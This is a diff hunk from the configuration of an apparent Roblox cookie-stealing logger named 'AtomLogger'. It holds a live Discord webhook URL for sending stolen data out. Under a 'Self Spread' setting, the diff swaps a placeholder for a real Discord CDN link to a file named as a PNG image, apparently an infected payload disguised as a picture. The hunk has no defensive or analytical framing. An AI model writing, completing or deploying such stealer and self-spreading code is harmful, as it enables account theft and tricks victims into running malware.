@@ -5,7 +5,7 @@ webhook = 'https://discord.com/api/webhooks/1457080106819518658/31asaHrzVMjwBA6g
 avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
 botName = 'AtomLogger | ROBLOX'
 #   Settings - Self Spread    #
-fileLink = 'INFECTED FILE URL HERE'
+fileLink = 'https://cdn.discordapp.com/attachments/1457080067459911723/1461456438751789196/IMG_0465.png?ex=696bf05f&is=696a9edf&hm=741f1ff884e075c67bf6f11255c57e4c29d27f2065d4031ed511a5794f7772fb&'
 
 #   Functions   #
 def sendWebhook(beamed):
